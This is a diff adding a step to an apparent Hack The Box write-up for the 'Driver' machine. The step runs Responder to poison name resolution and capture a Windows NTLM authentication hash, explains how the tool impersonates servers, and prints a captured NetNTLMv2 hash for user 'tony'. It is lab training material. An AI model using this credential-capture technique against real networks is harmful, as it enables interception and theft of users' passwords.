@@ -130,6 +130,20 @@ Command=ToggleDesktop
 Upload File
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/67073226-d33c-4442-8199-8c489f76d602)
 
+Get NTLM Password Hash
+```CSS
+responder.py -I tun0
+```
+What is Responder?
+Responder enables DNS poisoning on a target, along with built-in auth servers for HTTP, SMB, FTP, LDAP and MSSQL protocols, and also supports the NTLM authentication protocol (Windows Challenge/Response), which is used by the Microsoft Windows operating systems. Responder can be described as a program which listens for any outbound request from a machine to the outside network, like an FTP request, and then falsely represents itself as the requested server, enabling it to intercept all communication between the targeted machine and the server.
+
+Depending on the protocol and the type of authentication, Responder forwards the auth request towards the server, which can in turn respond with a challenge that the target has to respond to in order to successfully authenticate. Responder forwards that challenge towards the target, to which the targeted PC responds with a generated response, possibly a hash of its password made using the challenge sent by the server, which it sends back to the Responder, thinking it’s in fact, the target server.
+
+
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/986a37ae-1c85-4065-b026-3658bc612df6)
+```Hash
+tony::DRIVER:9ceecf21a93f312e:BDB5E4396EDEE360EAF01C0600802ED4:0101000000000000001399CB81E9D901A6E289629CFE18020000000002000800460030004C00460001001E00570049004E002D004F0051004C0047004600520036003400530033004F0004003400570049004E002D004F0051004C0047004600520036003400530033004F002E00460030004C0046002E004C004F00430041004C0003001400460030004C0046002E004C004F00430041004C0005001400460030004C0046002E004C004F00430041004C0007000800001399CB81E9D901060004000200000008003000300000000000000000000000002000007256B61760A63AC90A0EEB2BD3DC357C3ABADBD5FA4ED983D5D5049C0D2BD2170A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003400000000000000000000000000
+```
 
 
 SMB Enumeration
